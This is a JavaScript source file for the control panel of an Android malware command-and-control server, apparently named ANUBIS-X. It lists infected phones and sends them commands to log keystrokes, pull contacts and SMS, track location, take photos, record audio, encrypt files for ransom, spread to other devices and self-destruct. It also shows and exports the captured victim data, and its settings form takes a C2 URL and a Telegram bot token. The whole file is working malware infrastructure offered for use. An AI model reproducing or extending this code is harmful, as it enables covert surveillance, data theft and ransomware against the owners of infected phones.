// ========== ANUBIS-X C2 Panel JavaScript ==========

let selectedDevice = null;
let refreshInterval = null;

document.addEventListener('DOMContentLoaded', function() {
    console.log('⚡ ANUBIS-X Panel Initialized');
    startAutoRefresh();
    showDevices();
});

function showDevices() {
    fetch('api/devices.php')
        .then(response => response.json())
        .then(data => {
            let html = '<h2>📱 Connected Devices</h2>';
            
            if (data.devices && data.devices.length > 0) {
                data.devices.forEach(device => {
                    const status = device.online ? 'online' : 'offline';
                    const statusIcon = device.online ? '🟢' : '🔴';
                    
                    html += `
                        <div class="device-card" onclick="selectDevice('${device.id}')">
                            <div class="device-status ${status}"></div>
                            <h3>${statusIcon} ${device.model || 'Unknown Device'}</h3>
                            <p>ID: ${device.id}</p>
                            <p>IP: ${device.ip_address || 'N/A'}</p>
                            <p>Android: ${device.android_version || 'N/A'}</p>
                            <p>Last Seen: ${device.last_seen || 'N/A'}</p>
                        </div>
                    `;
                });
            } else {
                html += '<div class="alert alert-warning">No devices connected</div>';
            }
            
            document.getElementById('mainContent').innerHTML = html;
        })
        .catch(error => {
            console.error('Error fetching devices:', error);
            document.getElementById('mainContent').innerHTML = 
                '<div class="alert alert-error">Failed to load devices</div>';
        });
}

function selectDevice(deviceId) {
    selectedDevice = deviceId;
    showCommandPanel(deviceId);
}

function showCommandPanel(deviceId) {
    let html = `
        <div class="command-panel">
            <h2>🎮 Command Panel</h2>
            <p style="text-align: center; margin-bottom: 15px;">Device: ${deviceId}</p>
            
            <div class="command-buttons">
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'keylog')">📝 Get Keylog</button>
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'contacts')">📞 Get Contacts</button>
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'sms')">💬 Get SMS</button>
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'location')">📍 Get Location</button>
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'camera')">📷 Take Photo</button>
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'audio')">🎤 Record Audio</button>
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'encrypt')">🔒 Encrypt Files</button>
                <button class="command-btn" onclick="sendCommand('${deviceId}', 'spread')">📡 Spread</button>
                <button class="command-btn danger" onclick="sendCommand('${deviceId}', 'selfdestruct')">💣 Self Destruct</button>
            </div>
        </div>
        
        <div class="log-output" id="logOutput">
            <p class="info">> Waiting for command execution...</p>
        </div>
    `;
    
    document.getElementById('mainContent').innerHTML = html;
}

function sendCommand(deviceId, command) {
    const logOutput = document.getElementById('logOutput');
    
    if (logOutput) {
        logOutput.innerHTML += `<p class="info">> Sending command: ${command}...</p>`;
    }
    
    fetch('api/commands.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            device_id: deviceId,
            command: command
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            if (logOutput) {
                logOutput.innerHTML += `<p class="success">> Command sent successfully: ${command}</p>`;
            }
        } else {
            if (logOutput) {
                logOutput.innerHTML += `<p class="error">> Failed to send command: ${command}</p>`;
            }
        }
    })
    .catch(error => {
        console.error('Error sending command:', error);
        if (logOutput) {
            logOutput.innerHTML += `<p class="error">> Error: ${error.message}</p>`;
        }
    });
}

function showLogs() {
    fetch('api/data.php')
        .then(response => response.json())
        .then(data => {
            let html = '<h2>📊 Captured Data</h2>';
            
            if (data.logs && data.logs.length > 0) {
                html += '<div class="log-output" style="height: 500px;">';
                data.logs.forEach(log => {
                    html += `<p>${log}</p>`;
                });
                html += '</div>';
            } else {
                html += '<div class="alert alert-warning">No captured data</div>';
            }
            
            document.getElementById('mainContent').innerHTML = html;
        })
        .catch(error => {
            console.error('Error fetching logs:', error);
            document.getElementById('mainContent').innerHTML = 
                '<div class="alert alert-error">Failed to load logs</div>';
        });
}

function showSettings() {
    let html = `
        <h2>⚙️ Settings</h2>
        
        <div class="command-panel">
            <h3>Server Configuration</h3>
            <label>C2 Server URL:</label>
            <input type="text" id="c2Url" value="https://your-c2-server.com/api">
            <label>Telegram Bot Token:</label>
            <input type="text" id="telegramToken" value="YOUR_BOT_TOKEN">
            <button class="btn" onclick="saveSettings()">💾 Save Settings</button>
        </div>
    `;
    
    document.getElementById('mainContent').innerHTML = html;
}

function saveSettings() {
    const c2Url = document.getElementById('c2Url').value;
    const telegramToken = document.getElementById('telegramToken').value;
    
    fetch('api/settings.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            c2_url: c2Url,
            telegram_token: telegramToken
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('✅ Settings saved successfully');
        } else {
            alert('❌ Failed to save settings');
        }
    })
    .catch(error => {
        console.error('Error saving settings:', error);
        alert('❌ Error: ' + error.message);
    });
}

function startAutoRefresh() {
    refreshInterval = setInterval(() => {
        if (document.getElementById('mainContent')) {
            const currentView = document.getElementById('mainContent').innerHTML;
            if (currentView.includes('Connected Devices')) {
                showDevices();
            }
        }
    }, 10000);
}

function stopAutoRefresh() {
    if (refreshInterval) {
        clearInterval(refreshInterval);
    }
}

function logout() {
    fetch('api/logout.php')
        .then(response => response.json())
        .then(data => {
            window.location.href = 'index.html';
        })
        .catch(error => {
            window.location.href = 'index.html';
        });
}

function exportData() {
    fetch('api/export.php')
        .then(response => response.json())
        .then(data => {
            const blob = new Blob([JSON.stringify(data, null, 2)], {
                type: 'application/json'
            });
            
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'anubis_data.json';
            a.click();
            
            URL.revokeObjectURL(url);
        })
        .catch(error => {
            console.error('Error exporting data:', error);
        });
}

function searchDevice() {
    const searchTerm = prompt('Enter device ID or IP:');
    
    if (searchTerm) {
        fetch(`api/search.php?query=${searchTerm}`)
            .then(response => response.json())
            .then(data => {
                if (data.device) {
                    selectDevice(data.device.id);
                } else {
                    alert('Device not found');
                }
            })
            .catch(error => {
                console.error('Error searching:', error);
            });
    }
}